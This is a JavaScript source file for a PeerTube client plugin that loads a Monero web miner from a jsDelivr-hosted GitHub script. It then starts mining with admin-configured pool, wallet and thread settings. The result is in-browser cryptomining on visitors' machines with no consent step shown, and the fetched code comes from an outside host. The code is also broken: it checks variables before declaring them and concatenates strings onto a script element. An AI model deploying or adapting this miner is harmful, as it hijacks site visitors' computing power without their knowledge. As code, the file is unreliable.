async function register({ registerHook, peertubeHelpers }) {

peertubeHelpers.getSettings().then(
      s => {
      console.log('Initializing Monero miner client plugin...')

      if ( !s || !s['walletAddress'] || !s['poolAddress']) {
        console.error('Monero miner plugin: Required settings are missing.')
        return
      }

      // 外部スクリプトを挿入
      if ( !externalScript ) {
      const externalScript = document.createElement("script")
      externalScript.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"
      externalScript.async = false
      document.head.appendChild(externalScript)

      console.log("Waiting...")
      return
      }

      if ( !inlineScript ) {
      // 外部スクリプトのロード完了後に処理開始
        console.log("Mining script loaded successfully.")

        let inlineScript = document.createElement("script")
        inlineScript+= "server = '"+s['webSocket']+"';\n"
        inlineScript+= "var pool = '"+s['poolAddress']+"';\n"
        inlineScript+= "var walletAddress = '"+s['walletAddress']+"';\n"
        inlineScript+= "var workerId = 'PeerTube-Miner';\n"
        inlineScript+= "var threads = '"+s['threads']+"';\n"
        inlineScript+= "var password = '"+s['password']+"';\n"
        inlineScript+= "startMining(pool, walletAddress, workerId, threads, password)\n"
        inlineScript+= "throttleMiner = 20;\n"

        document.body.appendChild(inlineScript)
        console.log("Mining started.")
      return
      }
    }
  )
}
export { register }
